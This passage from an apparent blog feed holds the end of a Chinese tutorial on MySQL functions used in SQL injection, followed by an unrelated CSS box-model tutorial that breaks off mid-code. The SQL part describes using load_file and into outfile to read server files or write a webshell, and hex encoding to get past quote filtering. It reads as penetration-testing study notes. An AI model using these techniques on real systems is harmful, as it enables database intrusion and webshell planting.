href="#515strcmp函数-strcmp函数是string-compare字符串比较的缩写用于比较两个字符串并根据比较结果返回整数-基本形式为strcmpstr1str2若str1str2则返回零若str1str2则返回负数若str1str2则返回正数">#</a> 5.15：strcmp () 函数  //strcmp 函数是 string compare (字符串比较) 的缩写，用于比较两个字符串并根据比较结果返回整数。基本形式为 strcmp (str1,str2)，若 str1=str2，则返回零；若 str1&lt;str2，则返回负数；若 str1&gt;str2，则返回正数</h4><p>​语句：select strcmp (version (),user ());</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624932788443-397f7a1f-e68f-4b50-995f-1c8e51fa357b.png" alt="img"></p><h4 id="516ifabc-如果a逻辑表达式为真则返回b否则返回c"><a class="markdownIt-Anchor" href="#516ifabc-如果a逻辑表达式为真则返回b否则返回c">#</a> 5.16：if (a,b,c) // 如果 a（逻辑表达式）为真，则返回 b，否则返回 c</h4><p>语句：select if (length (database ())=5,1,0);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624933121237-653ae586-4cfe-434e-a054-092d81d9457d.png" alt="img"></p><h4 id="517benchmarkcountexpr-重复计算expr表达式count次"><a class="markdownIt-Anchor" href="#517benchmarkcountexpr-重复计算expr表达式count次">#</a> 5.17：BENCHMARK (count,expr) // 重复计算 expr 表达式 count 次</h4><p>语句：select benchmark (5,1);</p><p>执行表达式 expr count 次，返回的结果都是 0。看返回结果是没有任何意义的，它的意义在于可以得到计算 count 次表达式 expr 后所需要的时间。表达式可以是 sql 语句，这样就可以看出一个 sql 语句写出来后效率怎么样，从而进行一定的优化。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624933324230-2a56d0b8-54bd-4f77-bde5-91afa1c75c80.png" alt="img"></p><h4 id="518locate函数-locatesubstrstr返回substr字符串在str中出现的位置没有返回0"><a class="markdownIt-Anchor" href="#518locate函数-locatesubstrstr返回substr字符串在str中出现的位置没有返回0">#</a> 5.18：locate () 函数  //locate (substr,str) 返回 substr 字符串在 str 中出现的位置，没有返回 0</h4><p>语句：select locate (‘r’,user ());</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624933413558-f0cb0ce0-325d-4489-a3c5-bacb1b81b825.png" alt="img"></p><h4 id="519position函数-positionsubstr-in-str返回substr字符串在str中出现的位置没有返回0"><a class="markdownIt-Anchor" href="#519position函数-positionsubstr-in-str返回substr字符串在str中出现的位置没有返回0">#</a> 5.19：position () 函数 //position (substr in str) 返回 substr 字符串在 str 中出现的位置，没有返回 0</h4><p>语句：select position (‘r’ in user ());</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624933444407-7c8aee41-20ee-4317-a24f-942714a2fcce.png" alt="img"></p><h4 id="520instr函数-instrstrsubstr返回substr字符串在str中出现的位置与locate相同只是参数顺序相反"><a class="markdownIt-Anchor" href="#520instr函数-instrstrsubstr返回substr字符串在str中出现的位置与locate相同只是参数顺序相反">#</a> 5.20：instr () 函数  //instr (str,substr) 返回 substr 字符串在 str 中出现的位置，与 locate 相同，只是参数顺序相反</h4><p>​语句：select instr (‘qweasdzXC’,‘w’);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624933537950-c57e8210-0b9a-44bf-bac2-35a2a9de07ee.png" alt="img"></p><h4 id="521hexunhex函数"><a class="markdownIt-Anchor" href="#521hexunhex函数">#</a> 5.21：hex ()&amp;unhex () 函数</h4><p>渗透中有些注入点因为数据库中对数据字段的类型定义，可能不支持 union 来显示某些不同类型的内容，所以使用 hex 对数据进行十六进制编码；</p><p>hex 参数可用于任何参数外面</p><p>select hex(concat(user(),1));</p><p>select hex(user()),hex(database())；</p><p>unhex () 则是用来将十六进制的内容转换回十进制</p><p>select unhex(‘726F6F74406C6F63616C686F737431’);</p><h4 id="522load_file函数"><a class="markdownIt-Anchor" href="#522load_file函数">#</a> 5.22：load_file () 函数</h4><p>load_file () 函数是 MySQL 读取本地 / 远程文件的函数</p><p>前提条件：</p><ul><li><ul><li>必须有权限读取且文件是可读的，低权限无法读取高权限用户文件</li><li>被文件必须在服务器上</li></ul></li><li><ul><li>必须知道文件的绝对路径   可用：select @@basedir;</li><li>读取的文件必须小于设定：max_allowed_packet</li></ul></li><li><ul><li>secure_file_priv 的值不为 NULL   使用 show global variables like ‘% secure%’; 查询是否为空，在 my.ini 设置为：secure_file_priv = ‘’</li></ul></li><li><ul><li><ul><li>查询结果为：secure_file_priv  NULL 时，表示不允许导入导出；</li><li>查询结果为：secure_file_priv  /xxx/ 时，表示只允许在当前目录导入导出；</li></ul></li></ul></li><li><ul><li><ul><li>查询结果为：secure_file_priv（空白）时，表示可以在任意目录进行导入导出；</li></ul></li></ul></li></ul><p>Windows：my.ini 中添加 secure_file_priv=</p><p>Linux：/etc/my.cnf 的 [mysqld] 下面添加 local-infile=0</p><p>语法：select load_file (‘D:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini’);</p><h4 id="523into-outfile函数"><a class="markdownIt-Anchor" href="#523into-outfile函数">#</a> 5.23：into outfile () 函数</h4><p>into outfile () 函数是用来导出文件的</p><p>用法示例：select “hello word” into outfile ‘D:\phpstudy_pro\WWW\1.txt’;</p><p>注意：</p><ul><li><ul><li><ul><li>在 SQL 注入时，我们可以利用 load_file 或者 into outfile () 对文件进行读取，或者写入 Webshell；</li><li>若过滤了单引号，则可以将函数中的字符进行 hex 编码。</li></ul></li></ul></li></ul><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS9zcWwvMjY5OTc1MC8xNjI3MzU2MzYzMDc1LTgyNTJkNDAwLTlkNjYtNDM1Ny05MjEwLTllYTFjNWNiNmVkMC5zcWw=">📎SQL 语句详细笔记.sql</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS9tZC8yNjk5NzUwLzE2MjczNTYzNjMwNjEtYjNkZjRjN2ItMzEwMi00NjhjLThkYWEtZDkxNmJhYjZjZDVjLm1k">📎mysql 数据库笔记.md</span></p><p>3&lt;4&lt;5</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql基本语法及sql注入&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#mysql基本语法及sql注入&quot;&gt;#&lt;/a&gt; MySQL 基本语法及 sql 注入&lt;/h1&gt;
&lt;h2 id=&quot;课堂导学&quot;&gt;&lt;a class=&quot;markdown</summary>
      
    
    
    
    <category term="信息安全—网络渗透" scheme="https://sun-spots.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E2%80%94%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>盒模型</title>
    <link href="https://sun-spots.github.io/2022/01/15/%E4%BF%AE%E6%94%B9/%E7%9B%92%E6%A8%A1%E5%9E%8B/"/>
    <id>https://sun-spots.github.io/2022/01/15/%E4%BF%AE%E6%94%B9/%E7%9B%92%E6%A8%A1%E5%9E%8B/</id>
    <published>2022-01-15T11:59:12.000Z</published>
    <updated>2022-01-18T15:05:48.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="盒模型"><a class="markdownIt-Anchor" href="#盒模型">#</a> 盒模型</h1><p>笔记来源：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==">尚硅谷 Web 前端 HTML5&amp;CSS3 初学者零基础入门全套完整版</span></p><h1 id="盒模型-2"><a class="markdownIt-Anchor" href="#盒模型-2">#</a> 盒模型</h1><h2 id="1-文档流normalflow"><a class="markdownIt-Anchor" href="#1-文档流normalflow">#</a> 1. 文档流（normalflow）</h2><p>网页是一个多层的结构，一层摁着一层</p><p>通过 CSS 可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层这些层中，最底下的一层称为文档流，文档流是网页的基础我们所创建的元素默认都是在文档流中进行排列。</p><p>对于我们来元素主要有两个状态</p><ul><li><p>在文档流中</p></li><li><p>不在文档流中（脱离文档流，元素处于漂浮状态）</p></li></ul><p>那么元素在文档流中有什么特点，我们接着往下看</p><p><strong>块级元素独自占一行且宽度会占满父元素宽度，行内元素不会独占一行，相邻行内元素可以排在同一行。</strong></p><h2 id="2-块元素"><a class="markdownIt-Anchor" href="#2-块元素">#</a> 2. 块元素</h2><p>CSS 中常见的块级元素：</p><p><img data-src="https://img1.imgtp.com/2022/01/18/d2uDuqWy.png" alt="9922720e0cf3d7caccc574e2fe1fbe096b63a977.png"></p><ul><li><p>块元素会在页面中独占一行，其后的元素也只能另起一行，并不能两个元素共用一行。</p></li><li><p>元素的高度、宽度、行高和顶底边距都是可以设置的，默认宽度是父元素的全部（会把父元素撑满）</p></li><li><p>默认高度是被内容撑开（子元素）</p></li></ul><h2 id="3-行内元素"><a class="markdownIt-Anchor" href="#3-行内元素">#</a> 3. 行内元素</h2><p><strong>CSS 中常见的行内元素：</strong></p><p><strong>伪元素默认为行内元素！！！！！！！！</strong></p><p><img data-src="https://img1.imgtp.com/2022/01/18/e9930SbM.png" alt=""></p><ul><li><p>行内元素不会独占页面的一行，只占自身的大小</p></li><li><p>行内元素在页面中左向右水平排列（书写习惯一致）</p></li><li><p>如果一行之中不能容纳下所有的行内元素，则元素会换到第二行继续自左向右排列</p></li><li><p>行内元素的默认宽度和高度都是被内容撑开</p></li></ul><h2 id="4-盒子模型"><a class="markdownIt-Anchor" href="#4-盒子模型">#</a> 4. 盒子模型</h2><p>网页设计中常听的属性名：内容 (content)、内边距 (padding)、边框 (border)、外边距 (margin)， CSS 盒子模型都具备这些属性。</p><p>这些属性我们可以用日常生活中的常见事物 —— 盒子作一个比喻来理解，所以叫它盒子模型。</p><p>CSS 盒子模型就是在网页设计中经常用到的 CSS 技术所使用的一种思维模型。</p><h3 id="盒模型-盒子模型-框模型box-model"><a class="markdownIt-Anchor" href="#盒模型-盒子模型-框模型box-model">#</a> 盒模型、盒子模型、框模型（box model）</h3><p>CSS 将页面中的所有元素都设置为了一个矩形的盒子</p><p>将元素设置为矩形的盒子后，对页面的布局就变成将不同的盒子摆放到不同的位置</p><p>每一个盒子都由一下几个部分组成：</p><ul><li><p>内容区（content）</p></li><li><p>内边距（padding）</p></li><li><p>边框（border）</p></li><li><p>外边距（margin）</p></li></ul><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/48f35f6a6bd57b18.png" alt=""></p><h3 id="内容区content"><a class="markdownIt-Anchor" href="#内容区content">#</a> 内容区（content）</h3><p>内容区是盒子模型的中心，它呈现了盒子的主要信息内容，这些内容可以是文本、图片等多种类型，用来放页面的内容</p><p><strong>元素中的所有的子元素和文本内容都在内容区中</strong></p><ul><li><p><code>width和height</code>  设置排列内容区的大小</p></li><li><p><code>width</code>  设置内容区的宽度</p></li><li><p><code>height</code>  设置内容区的高度</p></li></ul><p><strong>示例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>; </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边框border"><a class="markdownIt-Anchor" href="#边框border">#</a> 边框（border）</h3><p>边框属于盒子边缘，边框里边属于盒子内部，出了边框都是盒子的外部</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/9cedfdfe8ef11b50.gif" alt=""></p><p><strong>注意：边框的大小会影响到整个盒子的大小</strong></p><ul><li><p><code>border-width</code>  边框的宽度：默认 3px</p></li><li><ul><li><code>border-top-width</code>  上边框的宽度</li></ul></li><li><ul><li><code>border-right-width</code>  右边框的宽度</li></ul></li><li><ul><li><code>border-bottom-width</code>  下边框的宽度</li></ul></li><li><ul><li><code>border-left-width</code>  左边框的宽度</li></ul></li><li><p><code>border-color</code>  边框的颜色：默认使用 color 的颜色值</p></li><li><p><code>border-top-color</code>  上边框的颜色</p></li><li><p><code>border-right-color</code>  右边框的颜色</p></li><li><p><code>border-bottom-color</code>  下边框的颜色</p></li><li><p><code>border-left-color</code>  左边框的颜色</p></li><li><p><strong> <code>border-style</code>  边框的样式：没有默认值，必须指定</strong></p></li><li><ul><li><code>border-top-style</code>  上边框的样式</li></ul></li><li><ul><li><code>border-right-style</code>  右边框的样式</li></ul></li><li><ul><li><code>border-bottom-style</code>  下边框的样式</li></ul></li><li><ul><li><code>border-left-style</code>  左边框的样式</li></ul></li></ul><p><strong>示例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: red;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    solid  实线 </span></span><br><span class="line"><span class="comment">    dotted 点状虚线 </span></span><br><span class="line"><span class="comment">    dashed 虚线 </span></span><br><span class="line"><span class="comment">    double 双线 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不论是 <code>border-width</code>  、  <code>border-color</code>  、 <code>border-style</code>  还是其衍生出来的属性写法，都可以指定每个方向的边框情况</p><p>设定几个值就决定了对应方向的宽度、颜色或样式</p><ul><li><p>四个值： <code>上 右 下 左</code></p></li><li><p>三个值： <code>上 左右 下</code></p></li><li><p>两个值： <code>上下 左右</code></p></li><li><p>一个值： <code>上下左右</code></p></li></ul><p>其实不管设置几个值，只要记住：其顺序是按<strong>顺时针方向设置</strong>的，剩下的可以由矩形的对称性推导出来</p><p><code>border</code> ：简写属性，通过该属性可以同时设置边框所有的相关样式，并且没有顺序要求</p><ul><li><p><code>border-top</code>  上边框的宽度、颜色和样式</p></li><li><p><code>border-right</code>  右边框的宽度、颜色和样式</p></li><li><p><code>border-bottom</code>  下边框的宽度、颜色和样式</p></li><li><p><code>border-left</code>  左边框的宽度、颜色和样式</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123; </span><br><span class="line"><span class="attribute">border</span>: <span class="number">10px</span> red solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内边距padding"><a class="markdownIt-Anchor" href="#内边距padding">#</a> 内边距 (padding）</h3><p>内边距，也叫填充，是内容区和边框之间的空间</p><ul><li><p><code>padding-top</code>  上内边距</p></li><li><p><code>padding-right</code>  右内边距</p></li><li><p><code>padding-bottom</code>  下内边距</p></li><li><p><code>padding-left</code>  左内边距</p></li></ul><p>padding 内边距的简写属性，可以同时指定四个方向的内边距，规则和边框中属性值设置一样</p><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.outer</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding-right</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding-bottom</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.inner</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/3bfe25ad984ae842.png" alt=""></p><p>可以看出，当内外 div 宽度和高度一样时，由于 outer 设置了一个 padding 属性，其盒子大小被 “撑大了”</p><p><strong>盒子可见框的大小，由内容区、内边距和边框共同决定，所以在计算盒子大小时，需要将这三个区域加到一起计算</strong></p><h3 id="外边距margin"><a class="markdownIt-Anchor" href="#外边距margin">#</a> 外边距（margin）</h3><p>外边距，也叫空白边，位于盒子的最外围，是添加在边框外周围的空间。空白边使盒子之间不会紧凑地连接在一起，是 CSS 布局的一个重要手段</p><p>注意：外边距不会影响盒子可见框的大小，但是外边距会影响盒子的<strong>位置和占用空间</strong></p><p>一共有四个方向的外边距：</p><ul><li><p><code>margin-top</code>  上外边距</p></li><li><ul><li>设置正值，元素自身向下移动</li></ul></li><li><ul><li>设置负值，元素自身向上移动</li></ul></li><li><p><code>margin-right</code>  右外边距</p></li><li><ul><li>设置正值，其右边的元素向右移动</li></ul></li><li><ul><li>设置负值，其右边的元素向左移动</li></ul></li><li><ul><li>上述说法并不准确，对于块元素，设置 <code>margin-right</code>  不会产生任何效果</li></ul></li><li><p><code>margin-bottom</code>  下外边距</p></li><li><ul><li>设置正值，其下边的元素向下移动</li></ul></li><li><ul><li>设置负值，其下边的元素向上移动</li></ul></li><li><ul><li>上述说法并不准确，对于块元素，会有垂直方向上的边距重叠问题（后面会细说）</li></ul></li><li><p><code>margin-left</code>  左外边距</p></li><li><ul><li>设置正值，元素自身向右移动</li></ul></li><li><ul><li>设置负值，元素自身向左移动</li></ul></li></ul><p>元素在页面中是按照自左向右的顺序排列的，所以默认情况下</p><ul><li><p>如果我们设置的左和上外边距则会移动元素自身</p></li><li><p>而设置下和右外边距会移动其他元素</p></li></ul><p><strong>示例 1</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：同时写出上下外边距，以上外边距为准，同时写出左右外边距，以左外边距为准，</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/8a21256f55fd1321.png" alt=""></p><p><strong>示例 2</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">100px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> red solid;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/dcee4920ca6e98c6.png" alt=""></p><h2 id="5-水平方向布局"><a class="markdownIt-Anchor" href="#5-水平方向布局">#</a> 5. 水平方向布局</h2><p>元素在其<strong>父元素中水平方向</strong>的位置由以下几个属性共同决定</p><ul><li><p><code>margin-left</code></p></li><li><p><code>border-left</code></p></li><li><p><code>padding-left</code></p></li><li><p><code>width</code></p></li><li><p><code>padding-right</code></p></li><li><p><code>border-right</code></p></li><li><p><code>margin-right</code></p></li></ul><p>一个元素在其父元素中，水平布局必须要满足以下的等式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">margin-left</span> + <span class="attribute">border-left</span> + <span class="attribute">padding-left</span> + <span class="attribute">width</span> + <span class="attribute">padding-right</span> + <span class="attribute">border-right</span> + <span class="attribute">margin-right</span> = 其父元素的宽度</span><br></pre></td></tr></table></figure><p>以上等式必须满足，如果相加结果使等式不成立，则称为过渡约束</p><p>则等式会自动调整调整的情况：</p><ul><li><p>如果这七个值中没有 <code>auto</code>  的情况，则浏览器会自动调整 <code>margin-right</code>  值以使等式满足<br> <code>100 + 0 + 0 + 200 + 0 + 0 + 0 = 800</code>  ==&gt;  <code>100 + 0 + 0 + 200 + 0 + 0 + 500 = 800</code></p></li><li><p>如果这七个值中有 <code>auto</code>  的情况，则会自动调整 <code>auto</code>  值以使等式成立<br>这七个值中有三个值可以设置为 <code>auto</code>  ： <code>width</code> 、 <code>margin-left</code> 、 <code>maring-right</code></p></li></ul><ol><li><ol><li>如果某个值为 auto，则会自动调整 <code>auto</code>  的那个值以使等式成立<br> <code>200 + 0 + 0 + auto + 0 + 0 + 200 = 600</code>  ==&gt;  <code>200 + 0 + 0 + 400 + 0 + 0 + 200 = 800</code> <br> <code>auto + 0 + 0 + 200 + 0 + 0 + 200 = 600</code>  ==&gt;  <code>400 + 0 + 0 + 200 + 0 + 0 + 200 = 800</code> <br> <code>200 + 0 + 0 + 200 + 0 + 0 + auto = 600</code>  ==&gt;  <code>200 + 0 + 0 + 200 + 0 + 0 + 400 = 800</code></li><li>如果宽度为 <code>width=auto</code> ，则宽度会调整到最大，其他 <code>auto</code>  的外边距会自动设置为 0<br> <code>auto + 0 + 0 + auto + 0 + 0 + 200 = 600</code>  ==&gt;  <code>0 + 0 + 0 + 600 + 0 + 0 + 200 = 800</code> <br> <code>200 + 0 + 0 + auto + 0 + 0 + auto = 600</code>  ==&gt;  <code>200 + 0 + 0 + 600 + 0 + 0 + 0 = 800</code> <br> <code>auto + 0 + 0 + auto + 0 + 0 + auto = 600</code>  ==&gt;  <code>0 + 0 + 0 + 800 + 0 + 0 + 0 = 800</code></li></ol></li><li><ol><li>如果外边距都为 padding-width = <code>auto</code> ，则 <code>auto</code>  的外边距会自动均分以使等式成立<br> <code>auto + 0 + 0 + 200 + 0 + 0 + auto = 600</code>  ==&gt;  <code>300 + 0 + 0 + 200 + 0 + 0 + 300 = 800</code></li></ol></li></ol><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span></span><br><span class="line"><span class="css">        <span class="comment">/* 下列条件等价于 margin: 0 auto */</span></span></span><br><span class="line"><span class="css">        <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-垂直方向布局"><a class="markdownIt-Anchor" href="#6-垂直方向布局">#</a> 6. 垂直方向布局</h2><h3 id="元素溢出"><a class="markdownIt-Anchor" href="#元素溢出">#</a> 元素溢出</h3><p>子元素是在父元素的内容区中排列的，如果子元素的大小超过了父元素，则子元素会从父元素中溢出</p><p>使用 <code>overflow</code> / <code>overflow-x</code> / <code>overflow-y</code>  属性来设置父元素如何处理溢出的子元素</p><p>可选值： <code>visible</code> / <code>hidden</code> / <code>scroll</code> / <code>auto</code></p><p><code>visible</code>  溢出内容会在父元素外部位置显示，默认值</p><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">10px</span> orange solid;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: visible; <span class="comment">/* 默认值 */</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    Lorem ipsum dolor sit amet consectetur adipisicing elit. Asperiores aspernatur illo inventore</span><br><span class="line">    deleniti laudantium quaerat excepturi sed quidem tempore? Eaque, cumque porro. Fuga quam error cupiditate quasi</span><br><span class="line">    eveniet in numquam!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/b2e8226eca59e78a.png" alt=""></p><p><code>hidden</code>  溢出内容会被裁剪，不会显示</p><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> 